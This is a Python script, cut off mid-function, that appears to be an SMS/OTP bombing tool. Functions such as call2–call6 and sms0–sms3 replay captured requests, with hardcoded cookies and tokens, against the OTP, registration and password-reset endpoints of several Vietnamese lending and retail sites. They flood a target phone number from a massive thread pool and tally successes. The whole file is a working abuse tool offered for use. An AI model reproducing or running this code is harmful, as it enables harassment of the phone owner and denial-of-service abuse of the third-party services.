import time
time.sleep(10)
thanhcong=0
thatbai=0
#import
import hashlib
import random,re
import string
import urllib.parse
import json
import requests
import sys
from bs4 import BeautifulSoup
import requests
import random
import json
import string
import time
from concurrent.futures import ThreadPoolExecutor
from pystyle import*
import os

#bỏ qua chứng chỉ ssl
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
#các hàm

def generate_random_string(length):
    letters_and_digits = string.ascii_letters + string.digits
    return ''.join(random.choice(letters_and_digits) for i in range(length))
def so(length):
    return ''.join(random.choice(string.digits) for _ in range(length))
def generate_random(length):
    return ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(length))
def generate_imei():
    return ''.join(random.choice(string.digits) for _ in range(15))
def Random_string(length, minh):
    return ''.join(random.choices(minh, k=length))
def get_SECUREID():
    return ''.join(random.choices('0123456789abcdef', k=17))
def getimei():
    return Random_string(8)+'-'+Random_string(4)+'-'+Random_string(4)+'-'+Random_string(4)+'-'+Random_string(12)
def get_TOKEN():
    return Random_string(22)+':'+Random_string(9)+'-'+Random_string(20)+'-'+Random_string(12)+'-'+Random_string(7)+'-'+Random_string(7)+'-'+Random_string(53)+'-'+Random_string(9)+'_'+Random_string(11)+'-'+Random_string(4)
def Random_string(length):
    letters = string.ascii_lowercase
    return ''.join(random.choice(letters) for _ in range(length))
def random_string(length):
    letters = string.ascii_lowercase
    return ''.join(random.choice(letters) for _ in range(length))
mail = generate_random(10)+'@gmail.com'
to=generate_random(53)+'-'+generate_random(86)+'-'+generate_random(121)+'_'+generate_random(2)+'-'+generate_random(94)+'-'+generate_random(3)+'_'+generate_random(9)+'-'+generate_random(15)+'_'+generate_random(17)+'-'+generate_random(39)+'_'+generate_random(85)+'_'+generate_random(34),
threading = ThreadPoolExecutor(max_workers=int(10000000))
from colorama import Fore
thatbai=0
day=0
status='ACTIVE'
blue = Col.light_blue
lblue = Colors.StaticMIX((Col.light_green, Col.white, Col.white))
red = Colors.StaticMIX((Col.green, Col.white, Col.white))
key = 5

ngay = 0
def exit1():
    exit()

def chk(day,status):
    os.system('cls')
    banner = '''
  ════ C H K ════
                                      
  WELCOME BACK BRO
YOUR DATE KEY : ''',day,'DAY','''
   STATUS : ''',status,'''
  THANKS YOU AND BYE
  
                                     '''
    print(Colorate.Vertical(Colors.DynamicMIX((Col.white, Col.yellow)), Center.XCenter(banner.center(100))))
def format_print1(text):
    return f"""                       {lblue}{text}{Col.reset}"""

def format_input1(text):
    return f"""                       {lblue}{text}{Col.reset}"""
#call 1 die
#call 3
#call 4 - die
#call 5
def call2(phone):
    global thanhcong
    global thatbai
    cookies = {
        '__cfruid': '63a37bafdcd9829166465852342b434e3776b4ae-1703855095',
        '_gcl_au': '1.1.727757230.1703855098',
        '_fbp': 'fb.1.1703855098188.1238484689',
        '_gid': 'GA1.2.749926425.1703855098',
        '_clck': '15quhef%7C2%7Cfhy%7C0%7C1458',
        'mousestats_vi': '052f0ae63e6cd789411c',
        'mousestats_si': 'd7e0d3d9c561f50ecd34',
        '_tt_enable_cookie': '1',
        '_ttp': 's-4nP6sF0_lgurBLCF1B-v21xWI',
        '_ym_uid': '1703855103588718017',
        '_ym_d': '1703855103',
        '_ym_isad': '2',
        '_ym_visorc': 'w',
        'jslbrc': 'w.20231229130514e7ecb828-a64a-11ee-895c-3ef70195ea5e.A_GS',
        'XSRF-TOKEN': 'eyJpdiI6IjB5aHdPNmR1NjR6dGxzUERkeGx1bVE9PSIsInZhbHVlIjoidnhMOVhFVkcweE85MHpsazAxS3RrZ1BMZTVTNXZkanB4MXd1bm5Jb0NtdGEydlBkbk5CODhKSTM2L3lQYlJ5MTRTQ3lVVVowc0JtR013QXNkRm1VRmxXdkZIZFpzaGEyUmp4Vy9uSW1nclNsOTIrdFJaSTVQWnBueXc1VDVRZHoiLCJtYWMiOiJmMGExMWJkZjQwZDYyMzFmMTFkNWYyYmJhZDc3MzM1OTlmOGEzMTc3OWI2ZDNkMTdlNTJiYzRmOTNlMzk0NGEzIiwidGFnIjoiIn0%3D',
        'sessionid': 'eyJpdiI6IkdJYVRuM25xVHJOR0ZqblVOQkpMZ0E9PSIsInZhbHVlIjoiUGR4aU1HZytFMmFrbHdzQmxrRmZaaDN1ZzNSRkdJTnNBUkl3U2IybU5HMTBEN0JQNGkxL2lyV1Rub25tNkt2Mmh4WmRhc3RiSWdDekkxbndQUkVnbnBWczZWYnc0VmRLR3Bwdk94ZEVybnhnNFMzcXhGWEtnMzliMnRLdHlvbXYiLCJtYWMiOiIwYjU0YmI0ZGNmMGM1NGVmMTExNDU3YjAyM2EzYmMwZDdkYWYyZWYyZTM5NTAxMDE4NzkyMGI5MjcxMmE3MmJjIiwidGFnIjoiIn0%3D',
        'utm_uid': 'eyJpdiI6IlcvNEJKSHZabXZzaE5sWHdDcy9wVlE9PSIsInZhbHVlIjoidkRaWE9nR3AzOHJKZHo4am5TOE1XU1lvb2RyeGczQzExOFRDZzhhWVZSZ0E1MW5oT2JXQU1kYllRSFRCN2Y3VS9kU2F6U3BVVm5NQ3JhaURIVTdkd2FjWXBBU0ZVckZJQXpPczc5eTA0U2gxZXRkUHBmd04zdDdZeDdRMm9xUnEiLCJtYWMiOiI5OGNkMDNjMmQ1MDJlYTRmMDc0YTVlMGE4NmFhYjdkZDI5ODZkZjYzZjFmYmU4MDc1YjIwMmFmYzliZDkwNmY2IiwidGFnIjoiIn0%3D',
        '_ga_EBK41LH7H5': 'GS1.1.1703855098.1.1.1703855134.24.0.0',
        '_ga': 'GA1.2.471021909.1703855098',
        'ec_cache_utm': '81c4b696-a147-509d-1759-988edae7b0b9',
        'ec_cache_client': 'false',
        'ec_cache_client_utm': 'null',
        'ec_png_utm': '81c4b696-a147-509d-1759-988edae7b0b9',
        'ec_png_client': 'false',
        'ec_png_client_utm': 'null',
        'ec_etag_utm': '81c4b696-a147-509d-1759-988edae7b0b9',
        'ec_etag_client': 'false',
        'ec_etag_client_utm': 'null',
        '_clsk': 'g7wdb4%7C1703855136127%7C4%7C1%7Cp.clarity.ms%2Fcollect',
        'uid': '81c4b696-a147-509d-1759-988edae7b0b9',
        'client': 'false',
        'client_utm': 'null',
    }

    headers = {
        'authority': 'vietloan.vn',
        'accept': '*/*',
        'accept-language': 'en-US,en;q=0.9,vi;q=0.8',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        # 'cookie': '__cfruid=63a37bafdcd9829166465852342b434e3776b4ae-1703855095; _gcl_au=1.1.727757230.1703855098; _fbp=fb.1.1703855098188.1238484689; _gid=GA1.2.749926425.1703855098; _clck=15quhef%7C2%7Cfhy%7C0%7C1458; mousestats_vi=052f0ae63e6cd789411c; mousestats_si=d7e0d3d9c561f50ecd34; _tt_enable_cookie=1; _ttp=s-4nP6sF0_lgurBLCF1B-v21xWI; _ym_uid=1703855103588718017; _ym_d=1703855103; _ym_isad=2; _ym_visorc=w; jslbrc=w.20231229130514e7ecb828-a64a-11ee-895c-3ef70195ea5e.A_GS; XSRF-TOKEN=eyJpdiI6IjB5aHdPNmR1NjR6dGxzUERkeGx1bVE9PSIsInZhbHVlIjoidnhMOVhFVkcweE85MHpsazAxS3RrZ1BMZTVTNXZkanB4MXd1bm5Jb0NtdGEydlBkbk5CODhKSTM2L3lQYlJ5MTRTQ3lVVVowc0JtR013QXNkRm1VRmxXdkZIZFpzaGEyUmp4Vy9uSW1nclNsOTIrdFJaSTVQWnBueXc1VDVRZHoiLCJtYWMiOiJmMGExMWJkZjQwZDYyMzFmMTFkNWYyYmJhZDc3MzM1OTlmOGEzMTc3OWI2ZDNkMTdlNTJiYzRmOTNlMzk0NGEzIiwidGFnIjoiIn0%3D; sessionid=eyJpdiI6IkdJYVRuM25xVHJOR0ZqblVOQkpMZ0E9PSIsInZhbHVlIjoiUGR4aU1HZytFMmFrbHdzQmxrRmZaaDN1ZzNSRkdJTnNBUkl3U2IybU5HMTBEN0JQNGkxL2lyV1Rub25tNkt2Mmh4WmRhc3RiSWdDekkxbndQUkVnbnBWczZWYnc0VmRLR3Bwdk94ZEVybnhnNFMzcXhGWEtnMzliMnRLdHlvbXYiLCJtYWMiOiIwYjU0YmI0ZGNmMGM1NGVmMTExNDU3YjAyM2EzYmMwZDdkYWYyZWYyZTM5NTAxMDE4NzkyMGI5MjcxMmE3MmJjIiwidGFnIjoiIn0%3D; utm_uid=eyJpdiI6IlcvNEJKSHZabXZzaE5sWHdDcy9wVlE9PSIsInZhbHVlIjoidkRaWE9nR3AzOHJKZHo4am5TOE1XU1lvb2RyeGczQzExOFRDZzhhWVZSZ0E1MW5oT2JXQU1kYllRSFRCN2Y3VS9kU2F6U3BVVm5NQ3JhaURIVTdkd2FjWXBBU0ZVckZJQXpPczc5eTA0U2gxZXRkUHBmd04zdDdZeDdRMm9xUnEiLCJtYWMiOiI5OGNkMDNjMmQ1MDJlYTRmMDc0YTVlMGE4NmFhYjdkZDI5ODZkZjYzZjFmYmU4MDc1YjIwMmFmYzliZDkwNmY2IiwidGFnIjoiIn0%3D; _ga_EBK41LH7H5=GS1.1.1703855098.1.1.1703855134.24.0.0; _ga=GA1.2.471021909.1703855098; ec_cache_utm=81c4b696-a147-509d-1759-988edae7b0b9; ec_cache_client=false; ec_cache_client_utm=null; ec_png_utm=81c4b696-a147-509d-1759-988edae7b0b9; ec_png_client=false; ec_png_client_utm=null; ec_etag_utm=81c4b696-a147-509d-1759-988edae7b0b9; ec_etag_client=false; ec_etag_client_utm=null; _clsk=g7wdb4%7C1703855136127%7C4%7C1%7Cp.clarity.ms%2Fcollect; uid=81c4b696-a147-509d-1759-988edae7b0b9; client=false; client_utm=null',
        'dnt': '1',
        'origin': 'https://vietloan.vn',
        'referer': 'https://vietloan.vn/register',
        'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'x-requested-with': 'XMLHttpRequest',
    }

    data = {
        'phone': phone,
        '_token': 'LzSrVTbPGjnooEq6rDJnTv6FgLJs2MLlGIZxXwka',
    }

    response = requests.post('https://vietloan.vn/register/phone-resend', cookies=cookies, headers=headers, data=data)
    if 'success' in response.text:
        thanhcong+=1
    else:
        thatbai+=1
#sms
def call3(phone):
    global thanhcong
    global thatbai
    headers = {
        'Host': 'api.kimungvay.co',
        # 'content-length': '73',
        'accept': 'application/json, text/plain, */*',
        'user-agent': 'Mozilla/5.0 (Linux; Android 8.1.0; Redmi 5A Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.130 Mobile Safari/537.36',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://h5.kimungvay.site',
        'x-requested-with': 'mark.via.gp',
        'sec-fetch-site': 'cross-site',
        'sec-fetch-mode': 'cors',
        'sec-fetch-dest': 'empty',
        'referer': 'https://h5.kimungvay.site/',
        # 'accept-encoding': 'gzip, deflate, br',
        'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
    }

    data = {
        'phone': f'{phone}',
        'type': '2',
        'ctype': '1',
        'chntoken': 'e51d233aa164cb9ec126578fc2d553f6',
    }
    response = requests.post('https://api.kimungvay.co/h5/LoginMessage_ultimate', headers=headers, data=data)
    if 'successfully' in response.text:
      thanhcong+=1
    else:
      thatbai+=1
def call4(phone):
    global thanhcong
    global thatbai
    cookies = {
        '_tt_enable_cookie': '1',
        '_ttp': 'f-P_yvdwOUkXHDWa-KFeVqOb4Wi',
        '_fw_crm_v': 'e52ba209-a5c6-4321-a346-6e6a67dec047',
        '_hjSessionUser_2281843': 'eyJpZCI6ImM5MjY1YTI3LTQ1YWItNWUxZC04OTUwLTUyOTMxZDg0ZWY5ZSIsImNyZWF0ZWQiOjE2OTcyOTQwMjg1MzYsImV4aXN0aW5nIjp0cnVlfQ==',
        '_hjSessionUser_2281853': 'eyJpZCI6IjVmZDdkZGZmLTZlMzItNWJiMi1hYzI3LTgzZjhhOWNlMmNlMCIsImNyZWF0ZWQiOjE2OTcyOTQwNTMyNDcsImV4aXN0aW5nIjp0cnVlfQ==',
        '_ga_ZN0EBP68G5': 'GS1.1.1698416121.3.0.1698416121.60.0.0',
        '_ga': 'GA1.2.1930964821.1697294026',
        '_gid': 'GA1.2.1622182646.1703856647',
        '_gat_UA-187725374-2': '1',
        '_fbp': 'fb.1.1703856648592.667258868',
        '_hjIncludedInSessionSample_2281843': '0',
        '_hjSession_2281843': 'eyJpZCI6IjQwYjY2MzdhLWM5YWMtNDJjNy04NWU3LTNjNmQ4OGExMTRmYyIsImMiOjE3MDM4NTY2NDg3OTMsInMiOjAsInIiOjAsInNiIjowfQ==',
        '_ga_2SRP4BGEXD': 'GS1.1.1703856646.1.0.1703856651.55.0.0',
        '_ga_ZBQ18M247M': 'GS1.1.1703856646.3.0.1703856651.55.0.0',
        '_cabinet_key': 'SFMyNTY.g3QAAAACbQAAABBvdHBfbG9naW5fcGFzc2VkZAAFZmFsc2VtAAAABXBob25lbQAAAAs4NDg2ODQxODA4OQ.L1D5PMjXLrblgQ-kevfx9MDp7PfNA91_Ln01iZ148QE',
        '_gcl_au': '1.1.1700522238.1697294026.14100726.1703856654.1703856653',
    }

    headers = {
        'authority': 'lk.takomo.vn',
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'en-US,en;q=0.9,vi;q=0.8',
        'content-type': 'application/json;charset=UTF-8',
        # 'cookie': '_tt_enable_cookie=1; _ttp=f-P_yvdwOUkXHDWa-KFeVqOb4Wi; _fw_crm_v=e52ba209-a5c6-4321-a346-6e6a67dec047; _hjSessionUser_2281843=eyJpZCI6ImM5MjY1YTI3LTQ1YWItNWUxZC04OTUwLTUyOTMxZDg0ZWY5ZSIsImNyZWF0ZWQiOjE2OTcyOTQwMjg1MzYsImV4aXN0aW5nIjp0cnVlfQ==; _hjSessionUser_2281853=eyJpZCI6IjVmZDdkZGZmLTZlMzItNWJiMi1hYzI3LTgzZjhhOWNlMmNlMCIsImNyZWF0ZWQiOjE2OTcyOTQwNTMyNDcsImV4aXN0aW5nIjp0cnVlfQ==; _ga_ZN0EBP68G5=GS1.1.1698416121.3.0.1698416121.60.0.0; _ga=GA1.2.1930964821.1697294026; _gid=GA1.2.1622182646.1703856647; _gat_UA-187725374-2=1; _fbp=fb.1.1703856648592.667258868; _hjIncludedInSessionSample_2281843=0; _hjSession_2281843=eyJpZCI6IjQwYjY2MzdhLWM5YWMtNDJjNy04NWU3LTNjNmQ4OGExMTRmYyIsImMiOjE3MDM4NTY2NDg3OTMsInMiOjAsInIiOjAsInNiIjowfQ==; _ga_2SRP4BGEXD=GS1.1.1703856646.1.0.1703856651.55.0.0; _ga_ZBQ18M247M=GS1.1.1703856646.3.0.1703856651.55.0.0; _cabinet_key=SFMyNTY.g3QAAAACbQAAABBvdHBfbG9naW5fcGFzc2VkZAAFZmFsc2VtAAAABXBob25lbQAAAAs4NDg2ODQxODA4OQ.L1D5PMjXLrblgQ-kevfx9MDp7PfNA91_Ln01iZ148QE; _gcl_au=1.1.1700522238.1697294026.14100726.1703856654.1703856653',
        'dnt': '1',
        'origin': 'https://lk.takomo.vn',
        'referer': 'https://lk.takomo.vn/?phone='+phone+'&amount=2000000&term=7&utm_source=direct_takomo&utm_medium=organic&utm_campaign=direct_takomo&utm_content=mainpage_submit',
        'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    }

    json_data = {
        'data': {
            'phone': phone,
            'code': 'send',
            'channel': 'ivr',
        },
    }

    response = requests.post('https://lk.takomo.vn/api/4/client/otp/send', cookies=cookies, headers=headers, json=json_data)
    if 'ok' in response.text:
        thanhcong+=1
    else:
        thatbai+=1
def call5(phone):
    global thanhcong
    global thatbai
    cookies = {
        '_gid': 'GA1.2.639248556.1703855363',
        '_gac_UA-214880719-1': '1.1703934459.CjwKCAiAnL-sBhBnEiwAJRGigk3nuS3VmBZTxlmTnmihK7Jj4G1pnQuSdHvXdaFWseaLPKWisQ2VcxoCf8IQAvD_BwE',
        '_gat_UA-214880719-1': '1',
        '_ga_RRJDDZGPYG': 'GS1.1.1703934458.2.1.1703934534.44.0.0',
        '_ga': 'GA1.2.1290509617.1703855363',
    }

    headers = {
        'authority': 'api.dongplus.vn',
        'accept': '*/*',
        'accept-language': 'vi',
        'content-type': 'application/json',
        # 'cookie': '_gid=GA1.2.639248556.1703855363; _gac_UA-214880719-1=1.1703934459.CjwKCAiAnL-sBhBnEiwAJRGigk3nuS3VmBZTxlmTnmihK7Jj4G1pnQuSdHvXdaFWseaLPKWisQ2VcxoCf8IQAvD_BwE; _gat_UA-214880719-1=1; _ga_RRJDDZGPYG=GS1.1.1703934458.2.1.1703934534.44.0.0; _ga=GA1.2.1290509617.1703855363',
        'dnt': '1',
        'origin': 'https://dongplus.vn',
        'referer': 'https://dongplus.vn/user/login',
        'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    }

    json_data = {
        'phone': '84' + phone[1:9],
    }

    response = requests.post(
        'https://api.dongplus.vn/api/user/send-one-time-password',
        cookies=cookies,
        headers=headers,
        json=json_data,
    )
    if "call" in response.text:
        thanhcong += 1
    else:
        thatbai += 1
def call6(phone):
    global thanhcong
    global thatbai
    cookies = {
        'JSESSIONID': 'D15C9181DF236AE13B2AD4DFC7F826EB',
    }

    headers = {
        'Host': 'h5.vivohan.com',
        'Connection': 'keep-alive',
        # 'Content-Length': '337',
        'system': 'android',
        'appcodename': 'Mozilla',
        'deviceType': 'h5',
        'screenresolution': '1080,1920',
        'appname': 'Netscape',
        'channel': 'e242',
        'w': '1080',
        'User-Agent': 'Mozilla/5.0 (Linux; Android 9; SM-G973N Build/PQ3B.190801.09191650) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Mobile Safari/537.36',
        'Content-Language': 'vn',
        'Accept': 'application/json, text/plain, */*',
        'platform': 'Linux i686',
        'vendor': 'Google Inc.',
        'Content-Type': 'application/json;charset=UTF-8',
        'h': '1920',
        'appversion': '5.0 (Linux; Android 9; SM-G973N Build/PQ3B.190801.09191650) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Mobile Safari/537.36',
        'Origin': 'https://h5.vivohan.com',
        'X-Requested-With': 'mark.via.gp',
        'Sec-Fetch-Site': 'same-origin',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Dest': 'empty',
        'Referer': 'https://h5.vivohan.com/login',
        # 'Accept-Encoding': 'gzip, deflate',
        'Accept-Language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
        # 'Cookie': 'JSESSIONID=D15C9181DF236AE13B2AD4DFC7F826EB',
    }

    data = {
        'phone': phone,
        'type': 2,
        'timestamp': 1703951639000,
        'referrer': 'utm_source=e242',
        'af_prt': 'e242',
        'sign': '0f656af82eb1da33221a06d1171db265',
        'appversion': '1.0.0',
        'channel': 1,
        'app_version': '1.0.0',
        'version': '1.0.0',
        'imei': 'f30c673736f5301bd94aaaad5b543d90',
        'uuid': 'f30c673736f5301bd94aaaad5b543d90',
        'pkg_name': 'com.qcvivo.vivohanh5',
    }
    response = requests.post('https://h5.vivohan.com/api/register/app/sendSms', cookies=cookies, headers=headers, data=data)
    thanhcong+=1

#sms 0
def sms0(phone):
    global thanhcong
    cookies = {
        'csrftoken': 'jxZ3X9GCAyb74yxGzBAEtd8Ke1TAXESU9qpypmmi6jAkrNC2lOo3vepbv5q29aU7',
        'tel': phone,
    }

    headers = {
        'Host': 'kavaycash.com',
        'Connection': 'keep-alive',
        'Cache-Control': 'max-age=0',
        'Upgrade-Insecure-Requests': '1',
        'User-Agent': 'Mozilla/5.0 (Linux; Android 9; SM-G973N Build/PQ3B.190801.09191650) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Mobile Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
        'X-Requested-With': 'mark.via.gp',
        'Sec-Fetch-Site': 'same-origin',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-User': '?1',
        'Sec-Fetch-Dest': 'document',
        'Referer': 'https://kavaycash.com/',
        # 'Accept-Encoding': 'gzip, deflate',
        'Accept-Language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
        # 'Cookie': 'csrftoken=jxZ3X9GCAyb74yxGzBAEtd8Ke1TAXESU9qpypmmi6jAkrNC2lOo3vepbv5q29aU7; tel=0357497741',
    }

    response = requests.get('https://kavaycash.com/verification/', cookies=cookies, headers=headers)
    thanhcong+=1
#sms 1
def sms1(phone):
    global thanhcong
    global thatbai
    cookies = {
        '_tt_enable_cookie': '1',
        '_ttp': 'UrWHpav-jlIIAkZIKfuHiWzvo3q',
        '_ym_uid': '1690890718761379945',
        '_ym_d': '1693615052',
        '_fbp': 'fb.1.1699102383332.1544435954',
        '_gcl_aw': 'GCL.1703856886.CjwKCAiA-bmsBhAGEiwAoaQNmqO3t9IJpw6h-bBXl_eMY2Y3ub9vjq6y1Nf84DY1MGEdS4Zw5rISzRoC00kQAvD_BwE',
        '_gcl_au': '1.1.667368353.1703856886',
        '_ga_P2783EHVX2': 'GS1.1.1703856890.5.0.1703856890.60.0.0',
        '_ym_isad': '1',
        '_ga': 'GA1.2.1456721416.1693615049',
        '_gid': 'GA1.2.84320069.1703856892',
        '_gac_UA-151110385-1': '1.1703856892.CjwKCAiA-bmsBhAGEiwAoaQNmqO3t9IJpw6h-bBXl_eMY2Y3ub9vjq6y1Nf84DY1MGEdS4Zw5rISzRoC00kQAvD_BwE',
        '_ym_visorc': 'w',
    }

    headers = {
        'authority': 'api.vayvnd.vn',
        'accept': 'application/json',
        'accept-language': 'vi-VN',
        'content-type': 'application/json; charset=utf-8',
        # 'cookie': '_tt_enable_cookie=1; _ttp=UrWHpav-jlIIAkZIKfuHiWzvo3q; _ym_uid=1690890718761379945; _ym_d=1693615052; _fbp=fb.1.1699102383332.1544435954; _gcl_aw=GCL.1703856886.CjwKCAiA-bmsBhAGEiwAoaQNmqO3t9IJpw6h-bBXl_eMY2Y3ub9vjq6y1Nf84DY1MGEdS4Zw5rISzRoC00kQAvD_BwE; _gcl_au=1.1.667368353.1703856886; _ga_P2783EHVX2=GS1.1.1703856890.5.0.1703856890.60.0.0; _ym_isad=1; _ga=GA1.2.1456721416.1693615049; _gid=GA1.2.84320069.1703856892; _gac_UA-151110385-1=1.1703856892.CjwKCAiA-bmsBhAGEiwAoaQNmqO3t9IJpw6h-bBXl_eMY2Y3ub9vjq6y1Nf84DY1MGEdS4Zw5rISzRoC00kQAvD_BwE; _ym_visorc=w',
        'dnt': '1',
        'origin': 'https://vayvnd.vn',
        'referer': 'https://vayvnd.vn/',
        'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'site-id': '3',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    }

    json_data = {
        'login': phone,
        'trackingId': 'h9vBHoAE9KcJ7xX6GF8sfN7hHxryAIwl28zt6ycjTI8JhfdLlE1fHyGTqQmw8AMN',
    }

    response = requests.post('https://api.vayvnd.vn/v2/users/password-reset', cookies=cookies, headers=headers, json=json_data)
    if "true" in response.text:
            thanhcong +=1
    else:
            thatbai+=1
#sms 2
def sms2(phone):
    global thanhcong
    global thatbai
    cookies = {
        'log_6dd5cf4a-73f7-4a79-b6d6-b686d28583fc': '49eb18d9-d110-4043-8ad4-7275d8b8d2e7',
        '_gcl_au': '1.1.810434433.1689606249',
        'fpt_uuid': '%226a6dc316-0db3-44a0-8891-224623887942%22',
        'ajs_group_id': 'null',
        '_tt_enable_cookie': '1',
        '_ttp': '8uDshq4oYRcpPmQFUdKlNsoewGP',
        '__admUTMtime': '1689606251',
        '__uidac': '9d45aa00b705e4c9ff20708ca0955e4f',
        '__iid': '',
        '__iid': '',
        '__su': '0',
        '__su': '0',
        '_gid': 'GA1.3.1682465247.1691155413',
        '_gat': '1',
        '_ga': 'GA1.1.1211624965.1689606248',
        'vMobile': '1',
        '__zi': '3000.SSZzejyD7iu_cVEzsr0LpYAPvhoKKa7GR9V-_yX0Iyz-rUpftKyLnd-SeEpVIXt1DvokvPf97yizcQtaDp0.1',
        'cf_clearance': 'm4Jw8L0YfcX1sOo1SwE_jMGACjNFcJ0fu_5BSusrDew-1691155422-0-1-386b1bcb.29faee9a.6f6a442b-0.2.1691155422',
        '_hjSessionUser_731679': 'eyJpZCI6ImIzZDQ0ZDBlLTFlMTUtNThhNS1iNzU1LWM5ODdjZmYzMTkxMyIsImNyZWF0ZWQiOjE2ODk2MDYyNTIyMTEsImV4aXN0aW5nIjp0cnVlfQ==',
        '_hjIncludedInSessionSample_731679': '0',
        '_hjSession_731679': 'eyJpZCI6ImJkOTcxOTVjLTM1Y2EtNDg1OC1hMDA1LTFmOWIxYzc3M2VjNiIsImNyZWF0ZWQiOjE2OTExNTU0MTg5NjksImluU2FtcGxlIjpmYWxzZX0=',
        '_ga_ZR815NQ85K': 'GS1.1.1691155413.2.0.1691155423.50.0.0',
    }

    headers = {
        'Accept': '*/*',
        'Accept-Language': 'en-US,en;q=0.9,vi;q=0.8',
        'Connection': 'keep-alive',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        # 'Cookie': 'log_6dd5cf4a-73f7-4a79-b6d6-b686d28583fc=49eb18d9-d110-4043-8ad4-7275d8b8d2e7; _gcl_au=1.1.810434433.1689606249; fpt_uuid=%226a6dc316-0db3-44a0-8891-224623887942%22; ajs_group_id=null; _tt_enable_cookie=1; _ttp=8uDshq4oYRcpPmQFUdKlNsoewGP; __admUTMtime=1689606251; __uidac=9d45aa00b705e4c9ff20708ca0955e4f; __iid=; __iid=; __su=0; __su=0; _gid=GA1.3.1682465247.1691155413; _gat=1; _ga=GA1.1.1211624965.1689606248; vMobile=1; __zi=3000.SSZzejyD7iu_cVEzsr0LpYAPvhoKKa7GR9V-_yX0Iyz-rUpftKyLnd-SeEpVIXt1DvokvPf97yizcQtaDp0.1; cf_clearance=m4Jw8L0YfcX1sOo1SwE_jMGACjNFcJ0fu_5BSusrDew-1691155422-0-1-386b1bcb.29faee9a.6f6a442b-0.2.1691155422; _hjSessionUser_731679=eyJpZCI6ImIzZDQ0ZDBlLTFlMTUtNThhNS1iNzU1LWM5ODdjZmYzMTkxMyIsImNyZWF0ZWQiOjE2ODk2MDYyNTIyMTEsImV4aXN0aW5nIjp0cnVlfQ==; _hjIncludedInSessionSample_731679=0; _hjSession_731679=eyJpZCI6ImJkOTcxOTVjLTM1Y2EtNDg1OC1hMDA1LTFmOWIxYzc3M2VjNiIsImNyZWF0ZWQiOjE2OTExNTU0MTg5NjksImluU2FtcGxlIjpmYWxzZX0=; _ga_ZR815NQ85K=GS1.1.1691155413.2.0.1691155423.50.0.0',
        'DNT': '1',
        'Origin': 'https://fptshop.com.vn',
        'Referer': 'https://fptshop.com.vn/',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36',
        'X-Requested-With': 'XMLHttpRequest',
        'sec-ch-ua': '"Not/A)Brand";v="99", "Google Chrome";v="115", "Chromium";v="115"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
    }

    data = {
        'phone': phone,
        'typeReset': '0',
    }

    response = requests.post('https://fptshop.com.vn/api-data/loyalty/Login/Verification', cookies=cookies, headers=headers, data=data)
    if '"error":false,'in response.text:
        thanhcong+=1
    else:
        thatbai+=1
#sms 3
def sms3(phone):
    global thanhcong
    headers = {
        'authority': 'kingme.pro',
        'accept': '*/*',
        'accept-language': 'en-US,en;q=0.9,vi;q=0.8',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
